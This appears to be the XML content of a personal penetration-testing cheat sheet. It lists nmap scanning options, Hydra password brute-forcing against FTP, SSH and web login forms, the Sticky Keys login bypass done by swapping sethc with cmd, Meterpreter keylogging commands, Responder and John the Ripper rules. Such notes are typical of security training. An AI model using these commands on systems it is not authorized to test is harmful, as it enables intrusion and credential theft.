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NMAP<text:line-break/><text:span text:style-name="T11">Scan live IPs, ports, services, versions, OS, banners.<text:line-break/></text:span>nmap IP <text:span text:style-name="T11"><text:s text:c="4"/>-scan top 1000 ports<text:line-break/></text:span>nmap -p- IP<text:span text:style-name="T11"> <text:s text:c="4"/>-scan all ports<text:line-break/></text:span>nmap -p 21,22 IP<text:span text:style-name="T11"> <text:s text:c="4"/>-scan chosen ports<text:line-break/></text:span>nmap -sS IP <text:s/><text:span text:style-name="T11"><text:s text:c="2"/>-SYN scan, fast, stealthy<text:line-break/></text:span>nmap -sV IP <text:span text:style-name="T11"><text:s text:c="3"/>-service version detect<text:line-break/></text:span>nmap -O IP <text:span text:style-name="T11"><text:s text:c="3"/>-scan OS<text:line-break/></text:span>nmap -sC IP <text:span text:style-name="T11"><text:s text:c="3"/>-banner grab<text:line-break/></text:span>nmap x.x.x1-50 <text:span text:style-name="T11"><text:s text:c="3"/>-scan IP range<text:line-break/></text:span>nmap -sn x.x.x.0/24 <text:span text:style-name="T11"><text:s text:c="3"/>-ping scan, check if host is alive<text:line-break/></text:span>nmap -Pn IP <text:span text:style-name="T11"><text:s text:c="3"/>-if ICMP is disabled<text:line-break/></text:span>nmap -sV --script safe IP <text:span text:style-name="T11"><text:s text:c="3"/>-safe, silent, banner grab, whois, snmp, dns, OS detect<text:line-break/></text:span>nmap -p 80 --script http-headers --script-args http.useragent="CUSTOM_NAME_AGENT" IP<text:span text:style-name="T11"> <text:s text:c="3"/>-set custom agent, visible in Wireshark and packets (default is Nmap Scripting Engine)<text:line-break/></text:span>nmap -sS -sV -O -T4 -p- IP -oN savefile.txt<text:span text:style-name="T11"> <text:s text:c="3"/>-fast, stealth, OS, save results</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P7">HYDRA - NETWORK LOGON CRACKER<text:line-break/><text:span text:style-name="T11">hydra -l USERNAME -P passlist.txt ftp://MACHINE_IP<text:line-break/>hydra -l USERNAME -P passlist.txt MACHINE_IP -t 4 ssh <text:s text:c="18"/>(-t threads to spawn)<text:line-break/><text:line-break/></text:span>Crack log in form:<text:span text:style-name="T11"><text:line-break/>sudo hydra USERNAME passlist.txt MACHINE_IP http-post-form "&lt;path&gt;:&lt;login_credentials&gt;:&lt;invalid_response&gt;"<text:line-break/>If there is invalid_response in response, then that are not correct credentials. Example:<text:line-break/><text:line-break/></text:span>Example crack on log in form (post):<text:span text:style-name="T11"><text:line-break/>hydra -l molly -P /usr/share/wordlists/rockyou.txt TARGETIP http-post-form "/login:username=^USER^&amp;password=^PASS^:Your username or password is incorrect."</text:span></text:p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Start PC with Win bootable USB.<text:line-break/>2. On first installation screen press shift+F10 for command prompt to appear.<text:line-break/>3. In cmd type notepad.<text:line-break/>4. Go to Save file as to get File Explorer.<text:line-break/>5. In File Explorer navigate to C:\Windows\System32, find file <text:span text:style-name="T1">sethc</text:span> (Sticky Keys) and rename it to sethc1.<text:line-break/>6. In same directory find file <text:span text:style-name="T1">cmd</text:span> and rename it to sethc.<text:line-break/><text:soft-pag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.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</text:span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oft-page-break/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pan text:style-name="T3"><text:line-break/></text:span><text:span text:style-name="T2">Examples</text:span></text:p>
            <text:p text:style-name="P12"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oft-page-break/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keyscan_start: Starts capturing keystrokes</text:p>
            <text:p text:style-name="P12">keyscan_stop: Stops capturing keystrokes</text:p>
            <text:p text:style-name="P12"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<text:soft-page-break/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3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<text:soft-page-break/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    <text:span text:style-name="T10">exit(-1)</text:span></text:p>
            <text:p text:style-name="P17">try:</text:p>
            <text:p text:style-name="P18"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line-break/>With responder tool listen on ens5 network interface:</text:p>
            <text:p text:style-name="P15"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</text:span><text:soft-page-break/><text:span text:style-name="T3">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Custom passwords generator.<text:line-break/>In file: /opt/john/john.conf <text:s/>or /etc/john/john.conf <text:s/>create:</text:p>
            <text:p text:style-name="P12"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[A-z]: Will include both upper and lowercase</text:p>
            <text:p text:style-name="P12">[A-Z]: Will include only uppercase letters</text:p>
            <text:p text:style-name="P12"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oft-page-break/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8" meta:paragraph-count="204" meta:word-count="1757" meta:character-count="12259"/>
  </office:meta>
</office:document-meta>
</file>